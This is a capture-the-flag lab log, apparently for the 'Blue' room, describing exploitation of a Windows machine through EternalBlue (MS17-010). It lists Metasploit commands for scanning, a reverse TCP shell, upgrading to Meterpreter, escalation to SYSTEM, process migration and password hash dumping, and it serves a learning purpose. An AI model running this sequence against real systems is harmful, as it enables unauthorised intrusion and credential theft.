# Blue - [11-20-2026]

## What This Covers

This execution log documents the exploitation of a vulnerable Windows machine through the EternalBlue (MS17-010) SMB vulnerability. It covers network scanning and vulnerability identification using Nmap, exploitation through Metasploit Framework, obtaining a reverse shell, upgrading it to a Meterpreter session, privilege escalation to NT AUTHORITY\SYSTEM, process migration, password hash extraction and cracking, and locating important files within the Windows file system.

## Key Concepts

* Understanding the MS17-010 (EternalBlue) vulnerability and its impact on vulnerable Windows SMB services.
* Performing network scanning and service enumeration to identify open ports and vulnerable SMB services.
* Using Metasploit Framework to search for, configure, and execute the EternalBlue exploit.
* Configuring a reverse TCP payload to establish a connection back to the attacking machine.
* Understanding the difference between a standard command shell and a Meterpreter session.
* Upgrading an existing shell to Meterpreter using a post-exploitation module.
* Escalating privileges to NT AUTHORITY\SYSTEM using Meterpreter.
* Enumerating running processes and migrating the Meterpreter session into a process running with SYSTEM privileges.
* Extracting Windows password hashes using the `hashdump` command.
* Understanding password hash cracking and identifying credentials belonging to non-default users.
* Exploring important Windows directories to locate system flags, stored password information, and administrator files.

## Commands/Tools Used

```bash
# Network Scanning and Enumeration:
nmap -sV -sC -Pn <TARGET_IP>

# Metasploit Framework:
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <TARGET_IP>

# Payload Configuration and Exploitation:
set payload windows/x64/shell/reverse_tcp
show options
exploit

# Shell Management:
background
sessions
sessions -l

# Shell to Meterpreter Conversion:
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
show options

run

# Privilege Escalation:
sessions -i <SESSION_ID>
getsystem
shell
whoami

# Process Enumeration and Migration:
ps
migrate <PROCESS_ID>

# Password Hash Extraction:
hashdump
```

## What I learned
I learned how to identify and exploit a vulnerable Windows SMB service using the EternalBlue (MS17-010) vulnerability. I performed network scanning to identify the target's exposed services and used Metasploit to configure and execute the appropriate exploit with a reverse TCP payload. After obtaining a command shell, I learned how to upgrade it to a Meterpreter session using a post-exploitation module. I then escalated privileges to NT AUTHORITY\SYSTEM, enumerated running processes, and migrated the session into a suitable SYSTEM-level process. Finally, I used Meterpreter's hashdump functionality to extract Windows password hashes, explored password-cracking techniques, and navigated important Windows directories to locate system information and the three planted flags.
